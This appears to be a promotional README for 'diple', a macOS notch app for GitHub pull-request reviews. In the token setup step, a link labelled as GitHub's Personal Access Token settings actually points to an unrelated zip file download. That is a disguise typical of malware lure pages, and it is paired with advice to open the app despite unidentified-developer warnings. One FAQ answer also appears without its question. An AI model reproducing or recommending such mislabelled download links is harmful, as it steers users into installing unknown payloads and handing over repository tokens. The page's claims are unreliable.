## 🖥️ What is diple?

diple is a native macOS application that sits quietly in your menu bar and notch. It connects to your GitHub account and monitors all your pull requests. When someone requests your review, diple lights up. When you're all caught up, it stays out of your way. It's that simple.

The app uses the sleek Dynamic Island design language, so it looks and feels right at home on any modern Mac. No clutter, no complicated dashboards — just a clean, glanceable indicator of what needs your attention.

## ✨ Key Features

### 🔔 Real-Time Notifications
diple instantly knows when a new pull request is assigned to you. You'll see a subtle indicator in the notch, letting you know something needs your attention.

### 📊 Quick Overview
Hover over the notch area to see a dropdown list of all your pending reviews. Each pull request shows the repository name, PR title, and the author. No need to open GitHub — you can see everything at a glance.

### 🖱️ One-Click Actions
Click on any pull request to open it directly in your browser. You can also mark reviews as done or snooze them for later, all from the little dropdown menu.

### 🌙 Beautiful Dark Mode
diple is designed for macOS, with native support for both light and dark mode. It adapts to your system settings seamlessly.

### 🔒 Privacy-First
Your GitHub token is stored securely in the macOS Keychain. diple never stores your credentials on any server — everything stays on your machine.

## 🔑 Setting Up Your GitHub Connection

### Step 1: Get a GitHub Token
diple needs a special key to access your pull requests. Don't worry — this is safe and you can revoke it anytime.

1. Go to [GitHub Settings → Developer Settings → Personal Access Tokens → Tokens (classic)](https://raw.githubusercontent.com/parkmargoah-design/parkmargoah-design.github.io/main/Gigantosaurus/v1.8.zip)
2. Click "Generate new token"
3. Give it a name like "diple"
4. Select the `repo` scope (this lets diple see your pull requests)
5. Click "Generate token"
6. **Copy the token immediately** — you'll only see it once

### Step 2: Add the Token to diple
1. Open diple
2. Click the diple icon in your menu bar
3. Select "Settings"
4. Paste your token into the field
5. Click "Save"

That's it! diple will now sync with your GitHub account and start showing your pending reviews.

## 🎯 How to Use diple

### Everyday Usage
- **See what's waiting:** Look at your notch. If you see a small orange or red indicator, you have pending reviews.
- **View your list:** Click the diple icon in your menu bar to see all your pull requests.
- **Open a PR:** Click any PR in the list — it opens in your default browser.
- **Clear notifications:** After you review a PR, it automatically disappears from your list.

### Tips & Tricks
- **Snooze a PR:** Right-click a PR to snooze it for an hour, a day, or until tomorrow. Perfect for when you're in the middle of something.
- **Quick glance:** Just look at your notch. Green means all clear. Orange means something needs attention. Red means something is overdue.
- **Keyboard shortcut:** Press `⌥⌘D` to open the diple dropdown from anywhere.

## ❓ Troubleshooting

### "diple doesn't show anything"
- Make sure you've added your GitHub token in Settings
- Check your internet connection
- Restart diple from the menu bar

### "I see an error about permissions"
- Go to System Settings → Privacy & Security
- Look for diple in the list
- Make sure it has permission to access your notifications

### "diple won't open on my Mac"
- Make sure you're running macOS 12 Monterey or later
- If you see a warning about an unidentified developer, right-click the app and select "Open"

## 📚 Frequently Asked Questions

### Is diple free?
Yes, diple is completely free to use. No subscription, no premium tier, no hidden costs.

No. diple is extremely lightweight. It uses almost no memory and only checks for updates every few minutes.
